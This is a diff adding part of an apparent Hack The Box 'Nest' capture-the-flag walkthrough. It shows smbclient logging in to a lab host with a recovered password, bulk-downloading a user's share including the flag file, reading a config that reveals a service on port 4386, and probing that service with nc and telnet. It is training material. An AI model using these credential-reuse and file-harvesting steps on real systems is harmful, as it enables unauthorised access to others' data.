@@ -545,4 +545,92 @@ There we go we have the new password
 
 "xRxRxPANCAK3SxRxRx"
 
+No now lets go back into SMB Client and see what she has.
 
+### SMB Client
+
+```console
+noob2uub@kali:~/ctf/htb/nest$ smbclient -U c.smith //10.10.10.178/Users xRxRxPANCAK3SxRxRx
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Jan 25 15:04:21 2020
+  ..                                  D        0  Sat Jan 25 15:04:21 2020
+  Administrator                       D        0  Fri Aug  9 08:08:23 2019
+  C.Smith                             D        0  Sat Jan 25 23:21:44 2020
+  L.Frost                             D        0  Thu Aug  8 10:03:01 2019
+  R.Thompson                          D        0  Thu Aug  8 10:02:50 2019
+  TempUser                            D        0  Wed Aug  7 15:55:56 2019
+
+		5242623 blocks of size 4096. 1839915 blocks available
+smb: \> cd C.Smith\
+smb: \C.Smith\> ls
+  .                                   D        0  Sat Jan 25 23:21:44 2020
+  ..                                  D        0  Sat Jan 25 23:21:44 2020
+  HQK Reporting                       D        0  Thu Aug  8 16:06:17 2019
+  user.txt                            A       34  Mon May  2 08:33:32 2022
+
+		5242623 blocks of size 4096. 1839915 blocks available
+smb: \C.Smith\> recurse on
+smb: \C.Smith\> prompt off
+smb: \C.Smith\> mget *
+getting file \C.Smith\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+getting file \C.Smith\HQK Reporting\Debug Mode Password.txt of size 0 as HQK Reporting/Debug Mode Password.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+getting file \C.Smith\HQK Reporting\HQK_Config_Backup.xml of size 249 as HQK Reporting/HQK_Config_Backup.xml (0.9 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HQK Reporting/AD Integration Module/HqkLdap.exe (51.2 KiloBytes/sec) (average 16.3 KiloBytes/sec)
+smb: \C.Smith\> 
+```
+
+and we see that we have out first flag also with user.txt, lets go through our loot. 
+
+We now find port 4386
+
+```console
+noob2uub@kali:~/ctf/htb/nest/HQK Reporting$ cat HQK_Config_Backup.xml 
+<?xml version="1.0"?>
+<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <Port>4386</Port>
+  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
+</ServiceSettings>noob2uub@kali:~/ctf/htb/nest/HQK Reporting$ 
+```
+running NC on the port doesn't get us much.
+
+```console
+noob2uub@kali:~/ctf/htb/nest/HQK Reporting$ nc 10.10.10.178 4386
+
+HQK Reporting Service V1.2
+
+>dir
+```
+NC doesnt get us anything so lets just try a few things like SSH, FTP, and Telnet
+
+TELNET works
+
+### Telnet
+
+```console
+noob2uub@kali:~/ctf/htb/nest/HQK Reporting$ telnet 10.10.10.178 4386
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is '^]'.
+
+HQK Reporting Service V1.2
+
+>ls
+
+Unrecognised command
+>dir
+
+Unrecognised command
+>help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+>
+```
